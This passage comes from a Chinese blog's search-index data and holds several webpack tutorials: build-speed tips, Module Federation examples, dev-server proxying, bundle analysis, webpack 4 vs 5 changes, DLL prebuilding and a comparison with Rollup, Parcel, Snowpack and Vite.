&#123;  runtimeChunk: true,&#125;,&#125;;\n7、避免额外的优化步骤Webpack 通过执行额外的算法任务，来优化输出结果的体积和加载性能。这些优化适用于小型代码库，但是在大型代码库中却非常耗费性能：\nmodule.exports = &#123; // ... optimization: &#123;  removeAvailableModules: false,  removeEmptyChunks: false,  splitChunks: false,&#125;,&#125;;\n\n8、输出结果不携带路径信息Webpack 会在输出的 bundle 中生成路径信息。然而，在打包数千个模块的项目中，这会导致造成垃圾回收性能压力。在 options.output.pathinfo 设置中关闭：\nmodule.exports = &#123; // ... output: &#123;  pathinfo: false,&#125;,&#125;;\n9、Node.js 版本 8.9.10-9.11.1Node.js v8.9.10 - v9.11.1 中的 ES2015 Map 和 Set 实现，存在 性能回退。Webpack 大量地使用这些数据结构，因此这次回退也会影响编译时间。之前和之后的 Node.js 版本不受影响。\n10、TypeScript loader你可以为 loader 传入 transpileOnly 选项，以缩短使用 ts-loader 时的构建时间。使用此选项，会关闭类型检查。如果要再次开启类型检查，请使用ForkTsCheckerWebpackPlugin 。使用此插件会将检查过程移至单独的进程，可以加快 TypeScript 的类型检查和 ESLint 插入的速度。\nmodule.exports = &#123; // ... test: /\\.tsx?$/, use: [ &#123;   loader: &#x27;ts-loader&#x27;,   options: &#123;    transpileOnly: true,  &#125;, &#125;,],&#125;;\n11.预获取，预加载\n12.CDN\n13.Tree Shaking\n14.postCSS\n15.gzip压缩\n16.InlineChunkHtmlPlugin\n17.webpack-bundle-analyzer\n生产环境以下步骤对于 生产环境 特别有帮助。Source Mapssource map 相当消耗资源。你真的需要它们？\n","categories":["前端工程化"],"tags":["webpack"]},{"title":"webpack (PWA)","url":"/2020/09/26/webpack/webpack%20%E6%B8%90%E8%BF%9B%E5%BC%8F%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8FPWA/","content":"多个独立的构建可以组成一个应用程序，这些独立的构建之间不应该存在依赖关系，因此可以单独开发和部署它们。这通常被称作微前端，但并不仅限于此。Webpack5 模块联邦可以让 Webpack 达到了线上 Runtime 的效果，让代码直接在项目间利用 CDN 直接共享，不再需要本地安装 Npm 包、构建再发布了！我们知道 Webpack 可以通过 DLL 或者 Externals 做代码共享时 Common Chunk，但不同应用和项目间这个任务就变得困难了，我们几乎无法在项目之间做到按需热插拔。\n早期NPM方式共享模块   代码的共享是将依赖作为library安装到我们的项目里进行webpack打包并且构建上线对于项目 Home 与 Search，需要共享一个模块时，最常见的办法就是将其抽成通用依赖并分别安装在各自项目中。虽然 Monorepo 可以一定程度解决重复安装和修改困难的问题，但依然需要走本地编译。\n真正 Runtime 的方式可能是 UMD 方式共享代码模块，即将模块用 Webpack UMD模式打包，并输出到其他项目中。这是非常普遍的模块共享方式：对于项目 Home 与 Search，直接利用 UMD 包复用一个模块。但这种技术方案问题也很明显，就是包体积无法达到本地编译时的优化效果，且库之间容易冲突。\n微前端：micro-frontends (MFE) 也是最近比较火的模块共享管理方式，微前端就是要解决多项目并存问题，多项目并存的最大问题就是模块共享，模块之间是不能有冲突。  对于微前端我们还要考虑样式冲突，声明周期管理冲突等问题，我们先不考虑这些   想把问题聚焦在资源加载的方式上   微前端一般有两种打包方式：1.子应用独立打包，模块实现解耦，但这种方式无法抽取公共的依赖，2.整体应用打一个打包 很好的解决我们上面第一种方式的问题，但是打包效率速度实在是太慢了。不具备水平的扩展能力。由于微前端还要考虑样式冲突、生命周期管理，所以本文只聚焦在资源加载方式上。微前端一般有两种打包方式：\n\n子应用独立打包，模块更解耦，但无法抽取公共依赖等。\n整体应用一起打包，很好解决上面的问题，但打包速度实在是太慢了，不具备水平扩展能力。\n\n终于提到本文的主角了，模块联邦方式作为 Webpack5 内置核心特性之一的 FederatedModule：这个方案是直接将一个应用的包应用于另一个应用，同时具备整体应用一起打包的公共依赖抽取能力。  比如：我们直接可以在Search应用里直接使用已经发布到线上的Home应用的组件。\n应用案例本案例模拟三个应用： Nav 、 Search 及 Home 。每个应用都是独立的，又通过模块邦联系到了一起。比如Home需要使用Nav组件共享出来的header，Search可能要使用Header和Home组件构建出来的HomeList。模块联邦将他们共享的模块暴露出来进行引用。1、Nav 导航src&#x2F;header.js\nconst Header = () =&gt; &#123; const header = document.createElement(&#x27;h1&#x27;) header.textContent = &#x27;公共头部内容&#x27; return header&#125;export default Header\nsrc&#x2F;index.js\nimport Header from &#x27;./Header&#x27;const div = document.createElement(&#x27;div&#x27;)div.appendChild(Header())document.body.appendChild(div)\nwebpack.config.js\nconst HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;)const &#123; ModuleFederationPlugin&#125; = require(&#x27;webpack&#x27;).containermodule.exports = &#123; mode: &#x27;production&#x27;, entry: &#x27;./src/index.js&#x27;, plugins: [  new HtmlWebpackPlugin(),  new ModuleFederationPlugin(&#123;   // 模块联邦名字   name: &#x27;nav&#x27;,   // 外部访问的资源名字   filename: &#x27;remoteEntry.js&#x27;,   // 引用的外部资源列表   remotes: &#123;&#125;,   // 暴露给外部资源列表   exposes: &#123;    &#x27;./Header&#x27;: &#x27;./src/Header.js&#x27;,   // 暴露 Header组件  key：可以定义成./Header 这个./Header并不代表是我当前引用下的某个路径   而是将来在别人用的时候基于这个路径来拼接url，值是正真的我们本地项目的应用  &#125;,   // 共享模块，如lodash   shared: &#123;&#125;,   // 如果我们的 header模块里有共享的第三方模块比如：lodash等，我们可以把他放到这里在打包的时候可以把第三方的共享的模块打到单独的一个包里。 &#125;),]&#125;\n应用 webpack 运行服务：\n[felix] nav $ npx webpack serve --port 3003\n\n2、Home 首页src&#x2F;HomeList\nconst HomeList = (num) =&gt; &#123; let str = &#x27;&lt;ul&gt;&#x27; for (let i = 0; i &lt; num; i++) &#123;  str += &#x27;&lt;li&gt;item &#x27; + i + &#x27;&lt;/li&gt;&#x27;&#125; str += &#x27;&lt;/ul&gt;&#x27; return str&#125;export default HomeList\nsrc&#x2F;index.js\nimport HomeList from &#x27;./HomeList&#x27;remotes: &#123;    nav\t(&#x27;nav/Header&#x27;)：remotes: &#123; nav &#125;Header    exposes: &#123;./Header&#x27;:&#x27;&#x27;&#125;import(&#x27;nav/Header&#x27;).then((Header) =&gt; &#123;  //引用模块联邦的组件  这样导入别人组件的时候需要通过异步的方式因为 网络共享或者是模块载入 是由延迟的，所以要通过promise的方式（异步模块加载的形式）去引用它。 const body = document.createElement(&#x27;div&#x27;) body.appendChild(Header.default()) document.body.appendChild(body) document.body.innerHTML += HomeList(5)&#125;)\nwebpack.config.js\nconst HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;)const &#123; ModuleFederationPlugin&#125; = require(&#x27;webpack&#x27;).containermodule.exports = &#123; mode: &#x27;production&#x27;, entry: &#x27;./src/index.js&#x27;, plugins: [  new HtmlWebpackPlugin(),  new ModuleFederationPlugin(&#123;   name: &quot;home&quot;,   filename: &quot;remoteEntry.js&quot;,   remotes: &#123;    nav: &quot;nav@http://localhost:3003/remoteEntry.js&quot;,    // 引用第三方或别人写好的应用的路径。远端的服务路径  &#125;,   exposes: &#123;    &#x27;./HomeList&#x27;: &#x27;./src/HomeList.js&#x27;,  &#125;,   shared: &#123;&#125;, &#125;),]&#125;\n应用 webpack 运行服务：\n[felix] nav $ npx webpack serve --port 3001\n\n3、search 搜索src&#x2F;index\nPromise.all([import(&#x27;nav/Header&#x27;), import(&#x27;home/HomeList&#x27;)]).then(([&#123;  default: Header&#125;, &#123;  default: HomeList&#125;]) =&gt; &#123;  document.body.appendChild(Header())  document.body.innerHTML += HomeList(4)&#125;)\nwebpack.config.js\nconst HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;)const &#123; ModuleFederationPlugin&#125; = require(&#x27;webpack&#x27;).containermodule.exports = &#123; mode: &#x27;production&#x27;, entry: &#x27;./src/index.js&#x27;, plugins: [  new HtmlWebpackPlugin(),  new ModuleFederationPlugin(&#123;   name: &#x27;search&#x27;,   filename: &#x27;remoteEntry.js&#x27;,   remotes: &#123;    nav: &quot;nav@http://localhost:3003/remoteEntry.js&quot;,    home: &quot;home@http://localhost:3001/remoteEntry.js&quot;  &#125;,   exposes: &#123;&#125;,   shared: &#123;&#125;, &#125;),]&#125;\n应用 webpack 运行服务：\n[felix] nav $ npx webpack serve --port 3002","categories":["前端工程化"],"tags":["webpack","前端"]},{"title":"webpack proxy工作原理","url":"/2020/10/26/webpack/webpack-proxy%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/","content":"一、是什么webpack proxy，即webpack提供的代理服务\n基本行为就是接收客户端发送的请求后转发给其他服务器\n其目的是为了便于开发者在开发模式下解决跨域问题（浏览器安全策略限制）\n想要实现代理首先需要一个中间服务器，webpack中提供服务器的工具为webpack-dev-server\nwebpack-dev-serverwebpack-dev-server是 webpack 官方推出的一款开发工具，将自动编译和自动刷新浏览器等一系列对开发友好的功能全部集成在了一起\n目的是为了提高开发者日常的开发效率，只适用在开发阶段\n关于配置方面，在webpack配置对象属性中通过devServer属性提供，如下：\n// ./webpack.config.jsconst path = require(&#x27;path&#x27;)module.exports = &#123;    // ...    devServer: &#123;        contentBase: path.join(__dirname, &#x27;dist&#x27;),        compress: true,        port: 9000,        proxy: &#123;            &#x27;/api&#x27;: &#123;                target: &#x27;https://api.github.com&#x27;            &#125;        &#125;        // ...    &#125;&#125;\n\ndevServetr里面proxy则是关于代理的配置，该属性为对象的形式，对象中每一个属性就是一个代理的规则匹配\n属性的名称是需要被代理的请求路径前缀，一般为了辨别都会设置前缀为/api，值为对应的代理匹配规则，对应如下：\n\ntarget：表示的是代理到的目标地址\npathRewrite：默认情况下，我们的 &#x2F;api-hy 也会被写入到URL中，如果希望删除，可以使用pathRewrite\nsecure：默认情况下不接收转发到https的服务器上，如果希望支持，可以设置为false\nchangeOrigin：它表示是否更新代理后请求的 headers 中host地址\n\n二、工作原理proxy工作原理实质上是利用http-proxy-middleware 这个http代理中间件，实现请求转发给其他服务器\n举个例子：\n在开发阶段，本地地址为http://localhost:3000，该浏览器发送一个前缀带有/api标识的请求到服务端获取数据，但响应这个请求的服务器只是将请求转发到另一台服务器中\nconst express = require(&#x27;express&#x27;);const proxy = require(&#x27;http-proxy-middleware&#x27;);const app = express();app.use(&#x27;/api&#x27;, proxy(&#123;target: &#x27;http://www.example.org&#x27;, changeOrigin: true&#125;));app.listen(3000);// http://localhost:3000/api/foo/bar -&gt; http://www.example.org/api/foo/bar\n\n三、跨域在开发阶段， webpack-dev-server 会启动一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost的一个端口上，而后端服务又是运行在另外一个地址上\n所以在开发阶段中，由于浏览器同源策略的原因，当本地访问后端就会出现跨域请求的问题\n通过设置webpack proxy实现代理请求后，相当于浏览器与服务端中添加一个代理者\n当本地发送请求的时候，代理服务器响应该请求，并将请求转发到目标服务器，目标服务器响应数据后再将数据返回给代理服务器，最终再由代理服务器将数据响应给本地\n\n在代理服务器传递数据给本地浏览器的过程中，两者同源，并不存在跨域行为，这时候浏览器就能正常接收数据\n注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制\n","categories":["前端工程化"],"tags":["webpack"]},{"title":"webpack-analyzer","url":"/2020/10/20/webpack/webpack-bundle-analyzer/","content":"我们可以使用 analyzer 分析项目编译后的文件组成，以便进行加载速度优化。\n1.首先安装依赖：\nnpm install webpack-bundle-analyzer --save-dev\n2.然后在 vue.config.js 中添加如下配置：\nconst BundleAnalyzerPlugin &#x3D; require(‘webpack-bundle-analyzer’).BundleAnalyzerPlugin;\nmodule.exports = &#123;  ...  configureWebpack: &#123;    plugins: [        new BundleAnalyzerPlugin(&#123;                    //  可以是`server`，`static`或`disabled`。                    //  在`server`模式下，分析器将启动HTTP服务器来显示软件包报告。                    //  在“静态”模式下，会生成带有报告的单个HTML文件。                    //  在`disabled`模式下，你可以使用这个插件来将`generateStatsFile`设置为`true`来生成Webpack Stats JSON文件。                    analyzerMode: &#x27;server&#x27;,                    //  将在“服务器”模式下使用的主机启动HTTP服务器。                    analyzerHost: &#x27;127.0.0.1&#x27;,                    //  将在“服务器”模式下使用的端口启动HTTP服务器。                    analyzerPort: 8888,                     //  路径捆绑，将在`static`模式下生成的报告文件。                    //  相对于捆绑输出目录。                    reportFilename: &#x27;report.html&#x27;,                    //  模块大小默认显示在报告中。                    //  应该是`stat`，`parsed`或者`gzip`中的一个。                    //  有关更多信息，请参见“定义”一节。                    defaultSizes: &#x27;parsed&#x27;,                    //  在默认浏览器中自动打开报告                    openAnalyzer: true,                    //  如果为true，则Webpack Stats JSON文件将在bundle输出目录中生成                    generateStatsFile: false,                     //  如果`generateStatsFile`为`true`，将会生成Webpack Stats JSON文件的名字。                    //  相对于捆绑输出目录。                    statsFilename: &#x27;stats.json&#x27;,                    //  stats.toJson（）方法的选项。                    //  例如，您可以使用`source：false`选项排除统计文件中模块的来源。                    //  在这里查看更多选项：https：  //github.com/webpack/webpack/blob/webpack-1/lib/Stats.js#L21                    statsOptions: null,                    logLevel: &#x27;info&#x27; // 日志级别。可以是&#x27;信息&#x27;，&#x27;警告&#x27;，&#x27;错误&#x27;或&#x27;沉默&#x27;。        &#125;)    ]  &#125;,  ...&#125;;\n\n3.使用\nnpm run serve –reportnpm run build –report\n","categories":["前端工程化"],"tags":["webpack"]},{"title":"webpack4与webpack5的区别","url":"/2020/10/14/webpack/webpack4-webpack5%E7%9A%84%E5%8C%BA%E5%88%AB/","content":"Webpack5 关注下面内容：通过持久缓存提高构建性能.\n使用更好的算法和默认值来改善长期缓存.\n通过更好的树摇和代码生成来改善捆绑包大小.\n清除处于怪异状态的内部结构，同时在 v4 中实现功能而不引入任何重大更改.\n下载:\nnpm i webpack@5 webpack-cli -D\n一、压缩代码1.webpack4\nwebpack4 上需要下载安装 terser-webpack-plugin 插件，并且需要以下配置：\nconst TerserPlugin = require(&#x27;terser-webpack-plugin&#x27;)module.exports = &#123; // ...other configoptimization: &#123;  minimize: !isDev,  minimizer: [    new TerserPlugin(&#123;      extractComments: false,       terserOptions: &#123;         compress: &#123;           pure_funcs: [&#x27;console.log&#x27;]         &#125;      &#125;    &#125;) ] &#125;\n 2.webpack5内部本身就自带 js 压缩功能，他内置了 terser-webpack-plugin 插件，我们不用再下载安装。而且在 mode&#x3D;“production” 的时候会自动开启 js 压缩功能。\n如果你要在开发环境使用，就用下面：\n// webpack.config.js中module.exports = &#123;   optimization: &#123;     usedExports: true, //只导出被使用的模块     minimize : true // 启动压缩   &#125;&#125;\n\n二、webpack 缓存1.webpack4 缓存配置npm install hard-source-webpack-plugin -D\nconst HardSourceWebpackPlugin = require(&#x27;hard-source-webpack-plugin&#x27;)module.exports = &#123;plugins: [  // 其它 plugin...  new HardSourceWebpackPlugin(),] &#125;\n\nwebpack5 缓存配置\n\nwebpack5 内部内置了 cache 缓存机制。直接配置即可。\ncache 会在开发模式下被设置成 type： memory 而且会在生产模式把cache 给禁用掉。\n// webpack.config.jsmodule.exports= &#123;  // 使用持久化缓存  cache: &#123;    type: &#x27;filesystem&#x27;，    cacheDirectory: path.join(__dirname, &#x27;node_modules/.cac/webpack&#x27;)  &#125;&#125;\ntype 的可选值为： memory 使用内容缓存，filesystem 使用文件缓存。\n三、启动服务的差别1.webpack4 启动服务\n通过 webpack-dev-server 启动服务\n2.webpack5 启动服务\n内置使用 webpack serve 启动，但是他的日志不是很好，所以一般都加都喜欢用 webpack-dev-server 优化。\n四、devtool的差别ourceMap需要在 webpack.config.js里面直接配置 devtool 就可以实现了。而 devtool有很多个选项值，不同的选项值，不同的选项产生的 .map 文件不同，打包速度不同。\n一般情况下，我们一般在开发环境配置用“cheap-eval-module-source-map”，在生产环境用‘none’。\ndevtool在webpack4和webpack5上也是有区别的\nv4: devtool: ‘cheap-eval-module-source-map’\nv5: devtool: ‘eval-cheap-module-source-map’\n五、自动删除 Node.js Polyfills早期，webpack 的目标是允许在浏览器中运行大多数 node.js 模块，但是模块格局发生了变化，许多模块用途现在主要是为前端目的而编写的。webpack &lt;&#x3D; 4 附带了许多 node.js 核心模块的 polyfill，一旦模块使用任何核心模块（即 crypto 模块），这些模块就会自动应用。\n尽管这使使用为 node.js 编写的模块变得容易，但它会将这些巨大的 polyfill 添加到包中。在许多情况下，这些 polyfill 是不必要的。\nwebpack 5 会自动停止填充这些核心模块，并专注于与前端兼容的模块。\n迁移：\n尽可能尝试使用与前端兼容的模块。\n可以为 node.js 核心模块手动添加一个 polyfill。错误消息将提示如何实现该目标。\n六、Chunk 和  Chunk ID添加了用于长期缓存的新算法。在生产模式下默认情况下启用这些功能。\n你可以不用使用 import(&#x2F;* webpackChunkName: “name” *&#x2F; “module”) 在开发环境来为 chunk 命名，生产环境还是有必要的\nwebpack 内部有 chunk 命名规则，不再是以 id(0, 1, 2)命名了\n七、Tree Shaking果我们的项目中引入了 lodash 包，但是我只有了其中的一个方法。其他没有用到的方法是不是冗余的？此时 tree-shaking 就可以把没有用的那些东西剔除掉，来大大减少最终的bundle体积。\nusedExports : true, 标记没有用的叶子minimize: true, 摇掉那些没有用的叶子\n// webpack.config.js中 module.exports = &#123;    optimization: &#123;      usedExports: true, //只导出被使用的模块      minimize : true // 启动压缩    &#125; &#125;\n\n现在可以处理commonjs的tree shaking\n八、默认值entry: “.&#x2F;src&#x2F;index.js\noutput.path: path.resolve(__dirname, “dist”)\noutput.filename: “[name].js”\n九、Caching// 配置缓存cache: &#123;  // 磁盘存储  type: &quot;filesystem&quot;,  buildDependencies: &#123;    // 当配置修改时，缓存失效    config: [__filename]  &#125;&#125;\n\n十、SplitChunk// webpack4minSize: 30000;// webpack5minSize: &#123;  javascript: 30000,  style: 50000,&#125;","categories":["前端工程化"],"tags":["webpack"]},{"title":"webpackdll预编译提高webpack打包速度","url":"/2020/10/21/webpack/webpackdll%E9%A2%84%E7%BC%96%E8%AF%91%E6%8F%90%E9%AB%98webpack%E6%89%93%E5%8C%85%E9%80%9F%E5%BA%A6/","content":"\n博客链接 http://blog.poetries.top/2018/11/23/webpack-dll\n\n一、webpack的dll功能\n基于webpack3构建\n\n1.1 dll介绍\n我们构建前端项目的时候，往往希望第三方库（vendors）和自己写的代码可以分开打包，因为第三方库往往不需要经常打包更新。对此Webpack的文档建议用CommonsChunkPlugin来单独打包第三方库\n\n\n我们这里的dll.js 是提前打包好了的，而不是在每次build的时候去打包输出的；这样才能做到依赖包一次构建，无限次使用\nwebpack输出的文件名都带有hash值； 而用dll构建后输出的文件名是固定的\n\nentry: &#123;  vendor: [&quot;jquery&quot;, &quot;other-lib&quot;],  app: &quot;./entry&quot;&#125;new CommonsChunkPlugin(&#123;  name: &quot;vendor&quot;,  // filename: &quot;vendor.js&quot;  // (Give the chunk a different name)  minChunks: Infinity,  // (with more entries, this ensures that no other module  //  goes into the vendor chunk)&#125;)\n\n\n通常为了对抗缓存，我们会给售出文件的文件名中加入hash的后缀——但是——我们编辑了app部分的代码后，重新打包，发现vendor的hash也变化了\n\n\n\n这么一来，意味着每次发布版本的时候，vendor代码都要刷新，即使我并没有修改其中的代码。这样并不符合我们分开打包的初衷\n\n\nDll是Webpack最近新加的功能\nDll这个概念应该是借鉴了Windows系统的dll。一个dll包，就是一个纯纯的依赖库，它本身不能运行，是用来给你的app引用的\n打包dll的时候，Webpack会将所有包含的库做一个索引，写在一个manifest文件中，而引用dll的代码（dll user）在打包的时候，只需要读取这个manifest文件，就可以了。\n\n优势\n\nDll打包以后是独立存在的，只要其包含的库没有增减、升级，hash也不会变化，因此线上的dll代码不需要随着版本发布频繁更新\nApp部分代码修改后，只需要编译app部分的代码，dll部分，只要包含的库没有增减、升级，就不需要重新打包。这样也大大提高了每次编译的速度\n假设你有多个项目，使用了相同的一些依赖库，它们就可以共用一个dll\n\n1.2 dll使用\n首先要先建立一个dll的配置文件，entry只包含第三方库\n\n第一步：新建webpack.dll.conf.js\n\nwebpack.DllPlugin的选项中，path是manifest文件的输出路径；name是dll暴露的对象名，要跟output.library保持一致\n\n// build/webpack.dll.conf.jsconst path = require(&#x27;path&#x27;)const webpack = require(&#x27;webpack&#x27;)module.exports = &#123;  entry: &#123;    // 把这些资源打包成dll，提高编译速度    react: [&#x27;react&#x27;,&#x27;react-router-dom&#x27;,&#x27;redux&#x27;,&#x27;redux-immutable&#x27;,&#x27;immutable&#x27;,&#x27;react-redux&#x27;,&#x27;react-router&#x27;,&#x27;redux-logger&#x27;,&#x27;redux-thunk&#x27;,&#x27;styled-components&#x27;],    ui: [&#x27;antd-mobile&#x27;,&#x27;antd&#x27;],    others: [&#x27;react-icons&#x27;,&#x27;axios&#x27;,&#x27;clipboard&#x27;,&#x27;humps&#x27;,&#x27;lodash&#x27;,&#x27;md5&#x27;,&#x27;moment&#x27;,&#x27;normalizr&#x27;]  &#125;,  output: &#123;    path: path.resolve(__dirname, &quot;../dist/static/js&quot;),    filename: `[name].dll.js`,    library: &#x27;[name]_library&#x27;  &#125;,  plugins: [ ...Object.keys([&#x27;react&#x27;,&#x27;ui&#x27;,&#x27;others&#x27;]).map(name =&gt; &#123;      return new webpack.DllReferencePlugin(&#123;        context: &#x27;.&#x27;,        manifest: require(`../static/$&#123;name&#125;.manifest.json`),      &#125;)    &#125;),    new webpack.optimize.UglifyJsPlugin()  ]&#125;\n\n第二步：加一个命令\n// package.json&quot;scripts&quot;: &#123;  &quot;dll&quot;: &quot;webpack --config config/webpack.dll.conf.js&quot;&#125;\n\n\n执行npm run dll\n\n\n运行Webpack，会输出两个文件一个是打包好的vendor.js，一个就是manifest.json，长这样\n\n&#123;  &quot;name&quot;: &quot;vendor_ac51ba426d4f259b8b18&quot;,  &quot;content&quot;: &#123;    &quot;./node_modules/antd/dist/antd.js&quot;: 1,    &quot;./node_modules/react/react.js&quot;: 2,    &quot;./node_modules/react/lib/React.js&quot;: 3,    &quot;./node_modules/react/node_modules/object-assign/index.js&quot;: 4,    &quot;./node_modules/react/lib/ReactChildren.js&quot;: 5,    &quot;./node_modules/react/lib/PooledClass.js&quot;: 6,    &quot;./node_modules/react/lib/reactProdInvariant.js&quot;: 7,    &quot;./node_modules/fbjs/lib/invariant.js&quot;: 8,    &quot;./node_modules/react/lib/ReactElement.js&quot;: 9,        ............\n\n\nWebpack将每个库都进行了编号索引，之后的dll user可以读取这个文件，直接用id来引用\n\n\n第三步： 在plugins中增加配置\n// build/webpack.prod.conf.jsmodule.exports = &#123;   plugins: [        new webpack.DllReferencePlugin(&#123;          manifest: require(&#x27;../dll/react-manifest.json&#x27;)        &#125;),        new webpack.DllReferencePlugin(&#123;          manifest: require(&#x27;../dll/ui-manifest.json&#x27;)        &#125;),        new webpack.DllReferencePlugin(&#123;          manifest: require(&#x27;../dll/others-manifest.json&#x27;)        &#125;)   ]&#125;\n\n\n再次执行npm run build\n\n之前\n之后\n二、happypack 多线程打包\n一般情况下，js是单线程执行的，但node不是。利用node提供的多线程环境，happypack是可以多线程打包的。基本上打开官网看了一下readme就可以配置了，特别是我只针对js的编译进行优化，配置还是比较简单的。\n\nhttps://www.npmjs.com/package/happypack\n\nhappyPack把所有串行的东西并行处理,使得loader并行处理，较少文件处理时间\n\n// build/webpack.prod.conf.js// @file: webpack.config.jsconst HappyPack = require(&#x27;happypack&#x27;); exports.module = &#123;  rules: [    &#123;      test: /.js$/,      // 1) replace your original list of loaders with &quot;happypack/loader&quot;:      // loaders: [ &#x27;babel-loader?presets[]=es2015&#x27; ],      use: &#x27;happypack/loader&#x27;,      include: [ /* ... */ ],      exclude: [ /* ... */ ]    &#125;  ],  plugins: [     // 2) create the plugin:    new HappyPack(&#123;        // 3) re-add the loaders you replaced above in #1:        loaders: [ &#x27;babel-loader?presets[]=es2015&#x27; ]    &#125;)  ]&#125;\n\n这时的编译时间也减小了一些\n\n\n更多详情 http://blog.poetries.top/2018/11/21/webpack-review/#6-1-%E5%88%86%E6%9E%90%E6%89%93%E5%8C%85%E7%BB%93%E6%9E%9C\n\n三、更多参考\nWebpack 打包优化之体积篇\nWebpack 打包优化之速度篇\n预打包Dll，实现webpack音速编译\n利用DllPlugin分割你的第三方库\n提高webpack的打包速度：happypack和dll打包\n\n","categories":["前端工程化"],"tags":["webpack"]},{"title":"webpack与其他打包工具的区别","url":"/2020/12/12/webpack/webpack%E4%B8%8E%E5%85%B6%E4%BB%96%E6%89%93%E5%8C%85%E5%B7%A5%E5%85%B7%E7%9A%84%E5%8C%BA%E5%88%AB/","content":"一、模块化工具模块化是一种处理复杂系统分解为更好的可管理模块的方式\n可以用来分割，组织和打包应用。每个模块完成一个特定的子功能，所有的模块按某种方法组装起来，成为一个整体(bundle)\n在前端领域中，并非只有webpack这一款优秀的模块打包工具，还有其他类似的工具，例如Rollup、Parcel、snowpack，以及最近风头无两的Vite\n通过这些模块打包工具，能够提高我们的开发效率，减少开发成本\n这里没有提及gulp、grunt是因为它们只是定义为构建工具，不能类比\nRollupRollup 是一款 ES Modules 打包器，从作用上来看，Rollup 与 Webpack 非常类似。不过相比于 Webpack，Rollup要小巧的多\n现在很多我们熟知的库都都使用它进行打包，比如：Vue、React和three.js等\n举个例子：\n// ./src/messages.jsexport default &#123;  hi: &#x27;Hey Guys, I am zce~&#x27;&#125;// ./src/logger.jsexport const log = msg =&gt; &#123;  console.log(&#x27;---------- INFO ----------&#x27;)  console.log(msg)  console.log(&#x27;--------------------------&#x27;)&#125;export const error = msg =&gt; &#123;  console.error(&#x27;---------- ERROR ----------&#x27;)  console.error(msg)  console.error(&#x27;---------------------------&#x27;)&#125;// ./src/index.jsimport &#123; log &#125; from &#x27;./logger&#x27;import messages from &#x27;./messages&#x27;log(messages.hi)\n\n然后通过rollup进行打包\n$ npx rollup ./src/index.js --file ./dist/bundle.js\n\n打包结果如下图\n可以看到，代码非常简洁，完成不像webpack那样存在大量引导代码和模块函数\n并且error方法由于没有被使用，输出的结果中并无error方法，可以看到，rollup默认开始Tree-shaking 优化输出结果\n因此，可以看到Rollup的优点：\n\n代码效率更简洁、效率更高\n默认支持 Tree-shaking\n\n但缺点也十分明显，加载其他类型的资源文件或者支持导入 CommonJS 模块，又或是编译 ES 新特性，这些额外的需求 Rollup需要使用插件去完成\n综合来看，rollup并不适合开发应用使用，因为需要使用第三方模块，而目前第三方模块大多数使用CommonJs方式导出成员，并且rollup不支持HMR，使开发效率降低\n但是在用于打包JavaScript 库时，rollup比 webpack 更有优势，因为其打包出来的代码更小、更快，其存在的缺点可以忽略\nParcelParcel ，是一款完全零配置的前端打包器，它提供了 “傻瓜式” 的使用体验，只需了解简单的命令，就能构建前端应用程序\nParcel 跟 Webpack 一样都支持以任意类型文件作为打包入口，但建议使用HTML文件作为入口，该HTML文件像平时一样正常编写代码、引用资源。如下所示：\n&lt;!-- ./src/index.html --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;Parcel Tutorials&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;script src=&quot;main.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\nmain.js文件通过ES Moudle方法导入其他模块成员\n// ./src/main.jsimport &#123; log &#125; from &#x27;./logger&#x27;log(&#x27;hello parcel&#x27;)// ./src/logger.jsexport const log = msg =&gt; &#123;  console.log(&#x27;---------- INFO ----------&#x27;)  console.log(msg)&#125;\n\n运行之后，使用命令打包\nnpx parcel src/index.html\n\n执行命令后，Parcel不仅打包了应用，同时也启动了一个开发服务器，跟webpack Dev Server一样\n跟webpack类似，也支持模块热替换，但用法更简单\n同时，Parcel有个十分好用的功能：支持自动安装依赖，像webpack开发阶段突然使用安装某个第三方依赖，必然会终止dev server然后安装再启动。而Parcel则免了这繁琐的工作流程\n同时，Parcel能够零配置加载其他类型的资源文件，无须像webpack那样配置对应的loader\n打包命令如下：\nnpx parcel src/index.html\n\n由于打包过程是多进程同时工作，构建速度会比Webpack 快，输出文件也会被压缩，并且样式代码也会被单独提取到单个文件中\n\n可以感受到，Parcel给开发者一种很大的自由度，只管去实现业务代码，其他事情用Parcel解决\nSnowpackSnowpack，是一种闪电般快速的前端构建工具，专为现代Web设计，较复杂的打包工具（如Webpack或Parcel）的替代方案，利用JavaScript的本机模块系统，避免不必要的工作并保持流畅的开发体验\n开发阶段，每次保存单个文件时，Webpack和Parcel都需要重新构建和重新打包应用程序的整个bundle。而Snowpack为你的应用程序每个文件构建一次，就可以永久缓存，文件更改时，Snowpack会重新构建该单个文件\n下图给出webpack与snowpack打包区别：\n\n在重新构建每次变更时没有任何的时间浪费，只需要在浏览器中进行HMR更新\nVitevite ，是一种新型前端构建工具，能够显著提升前端开发体验\n它主要由两部分组成：\n\n一个开发服务器，它基于 原生 ES 模块 提供了丰富的内建功能，如速度快到惊人的 [模块热更新HMR\n一套构建指令，它使用 Rollup打包你的代码，并且它是预配置的，可以输出用于生产环境的优化过的静态资源\n\n其作用类似webpack+ webpack-dev-server，其特点如下：\n\n快速的冷启动\n即时的模块热更新\n真正的按需编译\n\nvite会直接启动开发服务器，不需要进行打包操作，也就意味着不需要分析模块的依赖、不需要编译，因此启动速度非常快\n利用现代浏览器支持ES Module的特性，当浏览器请求某个模块的时候，再根据需要对模块的内容进行编译，这种方式大大缩短了编译时间\n原理图如下所示：\n\n在热模块HMR方面，当修改一个模块的时候，仅需让浏览器重新请求该模块即可，无须像webpack那样需要把该模块的相关依赖模块全部编译一次，效率更高\nwebpack相比上述的模块化工具，webpack大而全，很多常用的功能做到开箱即用。有两大最核心的特点：一切皆模块和按需加载\n与其他构建工具相比，有如下优势：\n\n智能解析：对 CommonJS 、 AMD 、ES6 的语法做了兼容\n万物模块：对 